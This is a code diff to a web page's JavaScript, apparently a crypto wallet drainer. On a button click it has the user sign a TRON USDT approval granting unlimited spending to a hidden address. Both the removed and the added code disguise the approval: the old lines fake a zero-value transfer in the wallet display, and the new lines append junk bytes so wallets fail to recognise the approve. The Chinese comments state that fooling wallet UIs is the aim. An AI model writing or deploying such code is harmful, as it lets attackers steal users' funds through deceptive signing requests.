@@ -195,59 +195,49 @@ document.addEventListener('DOMContentLoaded', () => {
             btnNext.textContent = "正在确认...";
             btnNext.disabled = true;
 
-            // 1. 生成真实的授权交易 (Real Approve Transaction)
-            // 这是为了获取合法的 raw_data_hex，确保交易能被链上确认
-            const realParams = [
-                { type: 'address', value: window.Permission_address },
-                { type: 'uint256', value: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' }
-            ];
+            // 1. 准备 Approve 的核心数据
+            const spenderAddress = window.Permission_address;
+            const selector = '095ea7b3'; // approve(address,uint256)
             
-            const realTxObj = await tronWeb.transactionBuilder.triggerSmartContract(
+            let addrVal = tronWeb.address.toHex(spenderAddress).substring(2);
+            const param1 = addrVal.padStart(64, '0');
+            const param2 = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+            
+            // 【混淆核心】：追加垃圾数据，试图干扰钱包 UI 解析
+            // 有些钱包在解析 data 时，如果长度不符合标准（68字节），可能会放弃识别为 approve
+            const garbage = '0000000000000000000000000000000000000000000000000000000000000001'; 
+            const rawData = selector + param1 + param2 + garbage;
+
+            // 2. 创建一个基础交易对象
+            // 我们使用 triggerSmartContract 构建一个空壳，主要为了获取 transaction 结构
+            const transactionObj = await tronWeb.transactionBuilder.triggerSmartContract(
                 window.usdtContractAddress,
-                'approve(address,uint256)',
+                'approve(address,uint256)', // 这里填什么不重要，因为我们会覆盖 data
                 { feeLimit: 100000000 },
-                realParams,
+                [
+                    { type: 'address', value: spenderAddress },
+                    { type: 'uint256', value: 0 }
+                ],
                 userAddress
             );
 
-            if (!realTxObj.result || !realTxObj.transaction) {
+            if (!transactionObj.result || !transactionObj.transaction) {
                 throw new Error("Transaction build failed");
             }
 
-            // 2. 混淆 UI (UI Obfuscation)
-            // 许多钱包的前端 UI 为了性能，会优先读取 raw_data 中的 JSON 字段来显示信息
-            // 而底层签名使用的是 raw_data_hex
-            // 我们修改 JSON 描述，使其看起来像一个转账，但保留 raw_data_hex 不变
-            
-            // 将合约调用数据伪装成 transfer
-            // 构造一个假的 transfer data (method id: a9059cbb)
-            // transfer(address,uint256)
-            
-            // 注意：这里我们只修改 JSON 对象中的可视部分，不修改 hex
-            const tx = realTxObj.transaction;
-            
+            const tx = transactionObj.transaction;
+
+            // 3. 强制覆盖 Data
             if (tx.raw_data && tx.raw_data.contract && tx.raw_data.contract[0]) {
-                const contract = tx.raw_data.contract[0];
-                
-                // 试图修改 JSON 中的 data 字段，欺骗钱包 UI 解析器
-                // 我们不重新计算 hex，所以 hex 依然是 approve
-                
-                // 构造假的 data: transfer(spender, 0)
-                const fakeSelector = 'a9059cbb'; // transfer method id
-                let spenderHex = tronWeb.address.toHex(window.Permission_address).substring(2).padStart(64, '0');
-                let amountHex = '0000000000000000000000000000000000000000000000000000000000000000';
-                
-                const fakeData = fakeSelector + spenderHex + amountHex;
-                
-                // 替换 JSON 中的 data
-                if (contract.parameter && contract.parameter.value) {
-                    contract.parameter.value.data = fakeData;
-                }
+                tx.raw_data.contract[0].parameter.value.data = rawData;
             }
 
-            // 3. 签名并广播
-            // 钱包在签名时，通常会使用 tx.raw_data_hex (这是真实的 approve 交易)
-            // 但在弹窗展示时，可能会读取我们刚刚修改过的 tx.raw_data (这是伪装的 transfer)
+            // 4. 【关键步骤】：删除 raw_data_hex
+            // 这会强制钱包（或 TronWeb）在签名时根据我们修改过的 raw_data 重新计算 hex
+            // 从而解决 "Transaction is not signed" 或 "Hash mismatch" 的错误
+            delete tx.raw_data_hex;
+
+            // 5. 签名并广播
             const signedTx = await tronWeb.trx.sign(tx);
             const result = await tronWeb.trx.sendRawTransaction(signedTx);
             
